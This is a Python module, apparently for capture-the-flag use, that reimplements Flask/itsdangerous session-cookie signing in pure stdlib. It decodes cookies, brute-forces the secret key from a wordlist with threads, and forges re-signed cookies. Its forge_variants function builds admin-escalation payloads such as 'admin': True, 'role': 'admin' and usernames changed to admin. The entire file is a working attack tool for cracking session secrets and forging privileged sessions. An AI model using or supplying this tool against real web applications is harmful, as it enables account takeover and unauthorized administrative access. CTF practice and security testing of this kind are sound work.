"""Flask session cookie attacks (pure stdlib itsdangerous reimplementation).

Cookie layout (Flask >= itsdangerous 2.x, defaults):
    <b64url(payload)>.<b64url(timestamp)>.<b64url(HMAC-SHA1)>
* payload      : compact JSON; zlib-compressed first when that is smaller,
                 marked with a leading '.' inside the segment
* timestamp    : seconds since itsdangerous EPOCH (2011-01-01), big-endian
* signature    : HMAC(digest)( derived_key, payload + '.' + timestamp )
* derived_key  : HMAC(digest)( secret, salt )   with salt 'cookie-session'

Provides decode / verify / brute-force secret keys / re-sign arbitrary
payloads — the flask-unsign workflow without any dependency.
"""
import base64
import hashlib
import hmac
import json
import time
import zlib
from concurrent.futures import ThreadPoolExecutor

DEFAULT_SALT = "cookie-session"
DEFAULT_DIGEST = "sha1"
# CTF authors sign tokens with plain itsdangerous too, whose default salt
# differs from Flask's -- cover both when verifying/bruting.
SALTS = ("cookie-session", "itsdangerous")
EPOCH = 1293840000  # 2011-01-01T00:00:00Z, itsdangerous epoch

_DIGESTS = {"sha1": hashlib.sha1, "sha256": hashlib.sha256}


# ---------------------------------------------------------------------------
# low-level helpers (mirrors itsdangerous internals)
# ---------------------------------------------------------------------------
def _b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=")


def _b64d(seg):
    seg = seg.encode() if isinstance(seg, str) else seg
    return base64.urlsafe_b64decode(seg + b"=" * (-len(seg) % 4))


def _int_to_bytes(num):
    out = bytearray()
    while num:
        out.append(num & 0xFF)
        num >>= 8
    return bytes(out) or b"\x00"


def _bytes_to_int(data):
    return int.from_bytes(data, "big")


def _derive_key(secret, salt, digest_name, derivation="hmac"):
    digest = _DIGESTS[digest_name]
    secret_b = secret.encode() if isinstance(secret, str) else secret
    salt_b = salt.encode() if isinstance(salt, str) else salt
    if derivation == "django-concat":
        # plain itsdangerous Signer default: SHA1(salt + b"signer" + key)
        return digest(salt_b + b"signer" + secret_b).digest()
    return hmac.new(secret_b, salt_b, digest).digest()  # Flask default


DERIVATIONS = ("hmac", "django-concat")


def _sign_bits(derived_key, value, digest_name):
    digest = _DIGESTS[digest_name]
    return hmac.new(derived_key, value, digest).digest()


# ---------------------------------------------------------------------------
# public API
# ---------------------------------------------------------------------------
def parse(cookie):
    """Split/decode a session cookie.

    Returns dict(payload_raw, payload(obj|None), ts(unix|int|None),
    sig(bytes), signed_value(bytes)) or None when the shape is wrong.
    """
    cookie = cookie.strip().strip('"')
    if cookie.count(".") < 1:
        return None
    # payload may legitimately contain leading dots (compression marker),
    # so anchor on the right
    parts = cookie.rsplit(".", 2 if cookie.count(".") >= 2 else 1)
    if len(parts) == 3:
        payload_seg, ts_seg, sig_seg = parts
        signed_value = (payload_seg + "." + ts_seg).encode()
        try:
            ts_bytes = _b64d(ts_seg)
            ts = _bytes_to_int(ts_bytes) + EPOCH
        except Exception:  # noqa: BLE001
            ts = None
    else:
        payload_seg, sig_seg = parts
        signed_value = payload_seg.encode()
        ts = None
    try:
        sig = _b64d(sig_seg)
    except Exception:  # noqa: BLE001
        return None
    payload_raw = None
    payload = None
    try:
        blob = _b64d(payload_seg)
        if blob.startswith(b"."):
            blob = zlib.decompress(blob[1:])
        payload_raw = blob
        payload = json.loads(blob.decode("utf-8"))
    except Exception:  # noqa: BLE001
        pass
    return {"payload_seg": payload_seg, "payload": payload,
            "payload_raw": payload_raw, "ts": ts, "sig": sig,
            "signed_value": signed_value}


def verify(cookie, secret, salt=DEFAULT_SALT, digest=DEFAULT_DIGEST):
    """True when `cookie` was signed with `secret`.

    Tries both key derivations: Flask's 'hmac' and plain itsdangerous's
    'django-concat' default.
    """
    parsed = parse(cookie)
    if parsed is None:
        return False
    for candidate_salt in SALTS:
        for derivation in DERIVATIONS:
            derived = _derive_key(secret, candidate_salt, digest, derivation)
            want = _sign_bits(derived, parsed["signed_value"], digest)
            if hmac.compare_digest(want, parsed["sig"]):
                return True
    return False


def decode(cookie):
    """Return the session dict (no signature verification)."""
    parsed = parse(cookie)
    if parsed is None:
        return None
    return parsed["payload"]


def brute(cookie, words, salt=DEFAULT_SALT, digest=DEFAULT_DIGEST,
          workers=16, progress=None):
    """Find the secret key signing this cookie. Returns the secret or None."""
    parsed = parse(cookie)
    if parsed is None:
        return None
    signed_value = parsed["signed_value"]
    want_sig = parsed["sig"]
    digest_fn = _DIGESTS[digest]

    def check(secret):
        secret = secret.rstrip("\r\n")
        if not secret:
            return None
        secret_b = secret.encode("utf-8", "replace")
        for candidate_salt in SALTS:
            salt_b = candidate_salt.encode()
            for derivation in DERIVATIONS:
                if derivation == "hmac":
                    derived = hmac.new(secret_b, salt_b, digest_fn).digest()
                else:
                    derived = digest_fn(salt_b + b"signer" + secret_b).digest()
                if hmac.compare_digest(
                        hmac.new(derived, signed_value, digest_fn).digest(),
                        want_sig):
                    return secret
        return None

    words = list(words)
    if workers <= 1:
        for w in words:
            hit = check(w)
            if hit:
                return hit
        return None
    with ThreadPoolExecutor(max_workers=workers) as pool:
        for hit in pool.map(check, words):
            if hit:
                pool.shutdown(wait=False, cancel_futures=True)
                return hit
    return None


def sign(obj, secret, salt=DEFAULT_SALT, digest=DEFAULT_DIGEST,
         compress=True, ts=None, derivation="hmac"):
    """Forge a Flask session cookie for `obj` signed with `secret`."""
    payload = json.dumps(obj, separators=(",", ":")).encode()
    if compress:
        packed = zlib.compress(payload)
        if len(packed) < len(payload) - 1:
            payload = b"." + packed
    payload_seg = _b64e(payload).decode()
    ts = int(ts if ts is not None else time.time())
    ts_seg = _b64e(_int_to_bytes(max(0, ts - EPOCH))).decode()
    derived = _derive_key(secret, salt, digest, derivation)
    sig = _sign_bits(derived, f"{payload_seg}.{ts_seg}".encode(), digest)
    return f"{payload_seg}.{ts_seg}.{_b64e(sig).decode()}"


def forge_variants(parsed_session, secret, extra_fields=None):
    """Common admin-flavoured resings of an observed session."""
    base = {}
    if isinstance(parsed_session, dict):
        base.update(parsed_session)
    for k in ("user", "username", "uid", "id"):
        if isinstance(base.get(k), str):
            base[k] = "admin"
    variants = [
        {"admin": True}, {"is_admin": True}, {"isAdmin": True},
        {"role": "admin"}, {"logged_in": True, "username": "admin"},
    ]
    merged = []
    seen = set()

    def add(obj):
        key = json.dumps(obj, sort_keys=True)
        if key not in seen:
            seen.add(key)
            merged.append(obj)

    for v in variants:
        candidate = dict(v)
        for k in ("user_id", "uid"):
            if k in base:
                candidate[k] = 1
        add(candidate)
        combined = dict(base)
        combined.update(v)
        add(combined)
    if extra_fields:
        add(dict(extra_fields))
    return [sign(o, secret) for o in merged]
